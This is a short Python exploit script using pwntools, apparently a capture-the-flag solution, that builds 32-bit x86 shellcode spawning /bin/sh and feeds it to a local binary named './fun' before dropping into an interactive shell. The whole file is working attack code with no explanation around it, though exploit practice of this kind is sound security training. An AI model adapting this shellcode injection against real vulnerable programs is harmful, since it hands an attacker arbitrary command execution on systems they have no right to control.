#!/usr/bin/python3
from pwn import process, asm

shell = process("./fun")

cmd = b"/bin/sh\x00"

shellcode  = b""
shellcode += asm("mov edi, esp")
shellcode += asm("xor ebx, ebx")

for i in range(0, len(cmd)):
    shellcode += asm(f"mov bl, {hex(cmd[i])}")
    shellcode += asm("mov [edi], bl")
    shellcode += asm("inc edi")
    shellcode += asm("nop")

shellcode += asm("xor eax, eax")
shellcode += asm("mov al, 0xb")
shellcode += asm("mov ebx, esp")
shellcode += asm("xor ecx, ecx")
shellcode += asm("xor edx, edx")
shellcode += asm("int 0x80")

shell.sendlineafter(b":\n", shellcode)
shell.interactive()
